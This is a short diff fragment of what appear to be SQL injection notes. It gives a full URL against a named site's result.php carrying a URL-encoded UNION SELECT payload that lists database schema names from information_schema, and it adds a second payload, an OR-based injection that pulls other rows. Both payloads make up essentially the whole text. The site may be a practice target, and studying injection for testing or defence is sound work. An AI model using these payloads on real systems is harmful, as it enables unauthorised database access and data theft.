@@ -126,4 +126,6 @@ Full URL
 
 https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20GROUP_CONCAT%28schema_name%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20information_schema.schemata%3B--%20
 
+### To find additional informations
 
+use:`' OR ``id``='3' -- `
